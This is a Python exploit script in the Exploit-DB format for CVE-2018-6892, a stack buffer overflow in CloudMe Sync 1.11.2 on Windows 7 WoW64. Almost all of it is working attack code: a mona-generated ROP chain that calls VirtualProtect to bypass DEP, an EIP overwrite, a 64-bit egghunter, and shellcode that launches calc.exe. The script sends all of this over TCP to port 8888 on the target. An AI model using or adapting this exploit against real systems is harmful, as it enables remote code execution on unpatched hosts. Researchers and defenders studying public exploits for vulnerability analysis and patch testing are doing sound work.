# Exploit Title: CloudMe Sync v1.11.2 Buffer Overflow - WoW64 - (DEP Bypass)
# Date: 24.01.2019
# Exploit Author: Matteo Malvica
# Vendor Homepage:https://www.cloudme.com/en
# Software: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Category: Remote
# Contact:https://twitter.com/matteomalvica
# Version: CloudMe Sync 1.11.2
# Tested on: Windows 7 SP1 x64
# CVE-2018-6892
# Ported to WoW64 from https://www.exploit-db.com/exploits/46218

import socket
import struct

def create_rop_chain():
	# rop chain generated with mona.py - www.corelan.be
        rop_gadgets = [
		0x61ba8b5e,  # POP EAX # RETN [Qt5Gui.dll]
		0x690398a8,  # ptr to &VirtualProtect() [IAT Qt5Core.dll]
		0x61bdd7f5,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [Qt5Gui.dll]
		0x68aef542,  # XCHG EAX,ESI # RETN [Qt5Core.dll]
		0x68bfe66b,  # POP EBP # RETN [Qt5Core.dll]
		0x68f82223,  # & jmp esp [Qt5Core.dll]
		0x6d9f7736,  # POP EDX # RETN [Qt5Sql.dll]
		0xfffffdff,  # Value to negate, will become 0x00000201
		0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll]
		0x61e870e0,  # POP EBX # RETN [Qt5Gui.dll]
		0xffffffff,  #
		0x6204f463,  # INC EBX # RETN [Qt5Gui.dll]
		0x68f8063c,  # ADD EBX,EDX # ADD AL,0A # RETN [Qt5Core.dll]
		0x61ec44ae,  # POP EDX # RETN [Qt5Gui.dll]
		0xffffffc0,  # Value to negate, will become 0x00000040
		0x6eb47092,  # NEG EDX # RETN [libgcc_s_dw2-1.dll]
		0x61e2a807,  # POP ECX # RETN [Qt5Gui.dll]
		0x6eb573c9,  # &Writable location [libgcc_s_dw2-1.dll]
		0x61e85d66,  # POP EDI # RETN [Qt5Gui.dll]
		0x6d9e431c,  # RETN (ROP NOP) [Qt5Sql.dll]
		0x61ba8ce5,  # POP EAX # RETN [Qt5Gui.dll]
		0x90909090,  # nop
		0x61b6b8d0,  # PUSHAD # RETN [Qt5Gui.dll]
  	]
        return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

target="127.0.0.1"
junk="A"*1052
eip = "\xfc\x57\xea\x61" #  0x61ea57fc
nops = "\x90\x90\x90\x90"

egg64 = ("\x66\x8c\xcb\x80\xfb\x23\x75\x08\x31\xdb\x53\x53\x53\x53\xb3\xc0"
"\x66\x81\xca\xff\x0f\x42\x52\x80\xfb\xc0\x74\x19\x6a\x02\x58\xcd"
"\x2e\x5a\x3c\x05\x74\xea\xb8"
"\x77\x30\x30\x74"  # tag w00t
"\x89\xd7\xaf\x75\xe5\xaf\x75\xe2\xff\xe7\x6a\x26\x58\x31\xc9\x89"
"\xe2\x64\xff\x13\x5e\x5a\xeb\xdf")

#Shellcode calc.exe
shellcode = ""
shellcode += "\xdb\xde\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\xba\xef"
shellcode += "\xc3\xbd\x59\x83\xc0\x04\x31\x50\x14\x03\x50\xfb\x21"
shellcode += "\x48\xa5\xeb\x24\xb3\x56\xeb\x48\x3d\xb3\xda\x48\x59"
shellcode += "\xb7\x4c\x79\x29\x95\x60\xf2\x7f\x0e\xf3\x76\xa8\x21"
shellcode += "\xb4\x3d\x8e\x0c\x45\x6d\xf2\x0f\xc5\x6c\x27\xf0\xf4"
shellcode += "\xbe\x3a\xf1\x31\xa2\xb7\xa3\xea\xa8\x6a\x54\x9f\xe5"
shellcode += "\xb6\xdf\xd3\xe8\xbe\x3c\xa3\x0b\xee\x92\xb8\x55\x30"
shellcode += "\x14\x6d\xee\x79\x0e\x72\xcb\x30\xa5\x40\xa7\xc2\x6f"
shellcode += "\x99\x48\x68\x4e\x16\xbb\x70\x96\x90\x24\x07\xee\xe3"
shellcode += "\xd9\x10\x35\x9e\x05\x94\xae\x38\xcd\x0e\x0b\xb9\x02"
shellcode += "\xc8\xd8\xb5\xef\x9e\x87\xd9\xee\x73\xbc\xe5\x7b\x72"
shellcode += "\x13\x6c\x3f\x51\xb7\x35\x9b\xf8\xee\x93\x4a\x04\xf0"
shellcode += "\x7c\x32\xa0\x7a\x90\x27\xd9\x20\xfe\xb6\x6f\x5f\x4c"
shellcode += "\xb8\x6f\x60\xe0\xd1\x5e\xeb\x6f\xa5\x5e\x3e\xd4\x59"
shellcode += "\x15\x63\x7c\xf2\xf0\xf1\x3d\x9f\x02\x2c\x01\xa6\x80"
shellcode += "\xc5\xf9\x5d\x98\xaf\xfc\x1a\x1e\x43\x8c\x33\xcb\x63"
shellcode += "\x23\x33\xde\x07\xa2\xa7\x82\xe9\x41\x40\x20\xf6"

payload = junk+ eip + nops * 3 + rop_chain + nops*4  + egg64 + nops*4  + "w00tw00t" + shellcode

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(payload)
except:
	print "Crashed!"